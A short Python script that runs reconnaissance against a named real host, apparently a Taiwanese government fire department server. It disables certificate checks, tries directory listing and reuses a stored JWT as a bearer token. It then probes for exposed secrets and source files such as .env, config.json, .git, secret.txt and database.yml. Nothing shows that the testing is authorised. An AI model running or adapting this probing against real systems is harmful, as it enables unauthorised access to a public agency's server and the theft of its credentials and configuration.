import requests, urllib3
urllib3.disable_warnings()

base = "https://tpertc.tfd.gov.tw:8787"

# Try downloading interesting images
files = ["logo.jpg", "logo_old.png", "loading.gif", "ok.gif", "calendar.jpg",
         "RTGHT.gif", "skype_logo.png", "print1.png", "shh_logo.gif"]

for f in files:
    r = requests.get(f"{base}/Images/{f}", verify=False, timeout=10)
    print(f"{f}: {r.status_code} len={len(r.content)} type={r.headers.get('Content-Type','')}")

# Try directory listing
print("\n=== /Images/ (no trailing content) ===")
r = requests.get(f"{base}/Images/", verify=False, timeout=10)
print(f"Status: {r.status_code}, Body: {r.text[:200]}")

# Try with JWT auth
token = open("/mnt/c/Users/Administrator/Desktop/JySecAI/erpc/data/femet_jwt.txt").read().strip()
headers = {"Authorization": f"Bearer {token}"}
print("\n=== With JWT auth ===")
r = requests.get(f"{base}/Images/", headers=headers, verify=False, timeout=10)
print(f"Status: {r.status_code}, Body: {r.text[:200]}")

# Check for config or source files in Images
common_files = [".env", "config.json", "config.js", "app.js", "server.js",
                "index.html", "index.php", ".htaccess", "secret.txt",
                "package.json", ".git", ".env", "database.yml"]
for f in common_files:
    r = requests.get(f"{base}/Images/{f}", headers=headers, verify=False, timeout=8)
    if r.status_code != 404:
        print(f"  /Images/{f}: {r.status_code} len={len(r.content)}")

print("\nDone")
